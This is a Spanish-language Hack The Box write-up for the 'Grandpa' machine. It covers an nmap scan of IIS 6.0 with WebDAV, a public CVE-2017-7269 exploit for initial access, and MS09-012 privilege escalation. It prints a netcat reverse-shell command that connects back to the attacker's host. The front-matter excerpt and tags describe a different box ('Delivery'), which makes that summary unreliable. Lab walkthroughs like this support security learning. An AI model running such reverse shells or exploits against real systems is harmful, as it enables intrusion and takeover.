---
layout: single
title: Grandpa - Hack The Box
excerpt: "Delivery is a quick and fun easy box where we have to create a MatterMost account and validate it by using automatic email accounts created by the OsTicket application. The admins on this platform have very poor security practices and put plaintext credentials in MatterMost. Once we get the initial shell with the creds from MatterMost we'll poke around MySQL and get a root password bcrypt hash. Using a hint left in the MatterMost channel about the password being a variation of PleaseSubscribe!, we'll use hashcat combined with rules to crack the password then get the root shell."
date: 2021-11-26
classes: wide
header:
  teaser: /assets/images/htb-writeup-Grandpa/granpa-logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:  
  - osticket
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-Grandpa/granpa-logo.png)

Machine IP = 10.10.10.14

Lo primero que realizo es verificar si la maquina esta activa mandándole un “ping” y esperando que me responda.

![](/assets/images/htb-writeup-Grandpa/pic1.png)

Después lo que hago es cuadrar mi entorno de trabajo por medio de un script en Python que cree el cual me dirá exactamente frente a que maquina estoy actuando y a la vez me va a crear unos directorios que normalmente uso.

![](/assets/images/htb-writeup-Grandpa/pic2.png)

##Port Scan

A continuación, mando el nmap:
  * nmap -sS -sV -sC -p- -vvv -oA allPorts 10.10.10.14

```
# Nmap 7.92 scan initiated Thu Nov 18 21:27:35 2021 as: nmap -sS -sV -sC -p- -vvv -oA allPorts 10.10.10.14
Nmap scan report for 10.10.10.14
Host is up, received echo-reply ttl 127 (0.077s latency).
Scanned at 2021-11-18 21:27:41 EST for 295s
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 6.0
|_http-title: Under Construction
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT POST MOVE MKCOL PROPPATCH
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
| http-webdav-scan:
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   Server Date: Fri, 19 Nov 2021 02:38:53 GMT
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_  Server Type: Microsoft-IIS/6.0
|_http-server-header: Microsoft-IIS/6.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Nov 18 21:32:36 2021 -- 1 IP address (1 host up) scanned in 301.27 seconds

```
##Web Site

Nos metemos a la pagina que esta en el puerto 80 (http), pero nos encontramos con una página que realmente no nos muestra mucho:

![](/assets/images/htb-writeup-Grandpa/pic3.png)

Con ayuda del whatweb y con searchsploit encontramos que existen posibles exploits para el IIS de Microsoft versión 6.0.

![](/assets/images/htb-writeup-Grandpa/pic4.png)

##Shell

Encontramos el exploit en https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269  el cual lo descargamos y corremos y tenemos acceso a la maquina como el usuario “nt authority\network service”


![](/assets/images/htb-writeup-Grandpa/pic5.png)

Para realizar la escalación de privilegios en máquinas Windows normalmente lo primero que mando es un systeminfo para poder recolectar un poco más de información sobre el sistema y de esta manera lograr ver si tiene alguna vulnerabilidad.

![](/assets/images/htb-writeup-Grandpa/pic6.png)

##Privilege escalation

Lo que mas me llama la atención es que la maquina esta corriendo bajo un OS Windows server 2003. Con ayuda de searchsploit busco sobre Windows server 2003 y nos encontramos con un script en C el cual nos toca compilar y posteriormente nos dará acceso como root.

![](/assets/images/htb-writeup-Grandpa/pic7.png)

Antes de iniciar con la escalada de privilegios, tenemos que mandar dos archivos a la maquina víctima, el primer archivo es MS09-012.exe (el archivo C compilado) y el segundo es nc.exe

![](/assets/images/htb-writeup-Grandpa/pic8.png)

Desde nuestra maquina escuchamos en el puerto 443 y corremos el .exe desde la maquina victima por medio del siguiente comando :
  * MS09-012.exe -d “C:\tmp\nc.exe -e cmd 10.10.14.14 443”

Finalmente tenemos acceso a la maquina como Root ( nt authority\system).

![](/assets/images/htb-writeup-Grandpa/pic9.png)
